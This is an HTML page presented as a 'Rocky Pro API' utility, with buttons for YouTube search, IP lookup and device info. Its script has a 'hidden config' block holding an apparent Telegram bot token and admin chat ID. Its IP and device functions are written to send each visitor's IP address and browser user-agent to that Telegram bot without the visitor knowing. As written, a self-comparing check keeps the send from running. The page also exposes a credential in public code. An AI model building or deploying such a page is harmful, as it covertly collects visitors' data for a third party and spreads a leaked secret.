<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- SEO -->
<meta property="og:title" content="Rocky Pro API">
<meta property="og:description" content="Cyber API System">
<meta property="og:image" content="https://i.imgur.com/UQoSZqc.jpeg">
<meta property="og:url" content="https://tinyurl.com/rocky-pro-api">

<title>Rocky Pro API</title>

<style>
body {
  margin:0;
  font-family:sans-serif;
  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
  color:white;
  text-align:center;
}

/* Cyber Header */
.cyber {
  font-size:20px;
  margin-top:20px;
  color:#00ffcc;
  text-shadow:0 0 10px #00ffcc;
  animation:glow 1.5s infinite alternate;
}
@keyframes glow {
  from {text-shadow:0 0 5px #00ffcc;}
  to {text-shadow:0 0 20px #00ffcc;}
}

/* Button */
.btn {
  display:block;
  margin:15px auto;
  padding:15px;
  width:80%;
  max-width:300px;
  border-radius:30px;
  background:linear-gradient(90deg,#00c6ff,#0072ff);
  border:none;
  color:white;
  font-size:16px;
  cursor:pointer;
}

/* Card */
.card {
  background:#111;
  margin:20px;
  padding:20px;
  border-radius:15px;
  box-shadow:0 0 15px #00f2ff;
}

/* Input */
input {
  padding:10px;
  width:80%;
  border-radius:10px;
  border:none;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="cyber">
⚡ MASTERMIND CYBER FORCES ⚡<br>
OWNER BY ROCKY CHOWDHURY
</div>

<h1>🚀 Rocky Pro API</h1>

<button class="btn" onclick="start()">🚀 Get Started</button>
<button class="btn" onclick="contact()">💬 Contact</button>

<!-- YouTube -->
<div class="card">
<h3>🔍 YouTube Search</h3>
<input id="yt" placeholder="Search video">
<br>
<button class="btn" onclick="ytSearch()">Search</button>
</div>

<!-- IP Info -->
<div class="card">
<h3>🌍 IP Info</h3>
<button class="btn" onclick="ip()">Check</button>
<p id="ipResult"></p>
</div>

<!-- Device Info -->
<div class="card">
<h3>📱 Device Info</h3>
<button class="btn" onclick="device()">Check</button>
<p id="dev"></p>
</div>

<script>
/* =========================
   🔒 HIDDEN CONFIG (EDIT HERE)
========================= */

// 👉 BOT TOKEN (paste here)
const BOT_TOKEN = "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs";

// 👉 ADMIN UID (paste here)
const ADMIN_UID = "6882953267";

/* ========================= */

function start(){
  window.open("https://t.me/Access_Terger_Bot");
}

function contact(){
  window.open("https://t.me/alveeevanrocky320");
}

// YouTube search
function ytSearch(){
  let q = document.getElementById("yt").value;
  if(!q) return alert("Enter search");
  window.open("https://www.youtube.com/results?search_query="+q);
}

// IP info
function ip(){
  fetch("https://api.ipify.org?format=json")
  .then(res=>res.json())
  .then(data=>{
    document.getElementById("ipResult").innerText="IP: "+data.ip;

    // send to telegram (optional basic log)
    if(BOT_TOKEN !== "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs"){
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_UID}&text=New Visitor IP: ${data.ip}`);
    }
  });
}

// Device info
function device(){
  let info = navigator.userAgent;
  document.getElementById("dev").innerText = info;

  if(BOT_TOKEN !== "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs"){
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_UID}&text=Device: ${info}`);
  }
}
</script>

</body>
</html>
